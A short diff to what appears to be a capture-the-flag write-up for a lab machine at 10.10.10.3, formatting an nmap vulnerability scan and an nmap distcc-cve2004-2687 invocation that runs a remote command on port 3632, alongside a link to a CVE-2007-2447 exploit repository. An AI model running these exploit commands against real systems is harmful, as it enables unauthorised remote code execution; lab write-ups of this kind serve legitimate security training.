@@ -34,13 +34,13 @@ https://github.com/amriunix/CVE-2007-2447
 
 # ${{\color{purple}Initial Foothold}}\ $
 
-nmap --script vuln 10.10.10.3 -p 3632
+``nmap --script vuln 10.10.10.3 -p 3632``
 
 ![image](https://user-images.githubusercontent.com/123066149/227918971-c481c332-b91a-4118-bf21-8036c2cca88f.png)
 
 # ${{\color{purple}Exploitation}}\ $
 
-nmap -p 3632 10.10.10.3 --script distcc-cve2004-2687.nse --script-args="distcc-exec.cmd='id'"
+``nmap -p 3632 10.10.10.3 --script distcc-cve2004-2687.nse --script-args="distcc-exec.cmd='id'"``
 
 ![image](https://user-images.githubusercontent.com/123066149/227919097-ed13e420-f29d-4a03-b4c4-e0c8fd95297c.png)
 
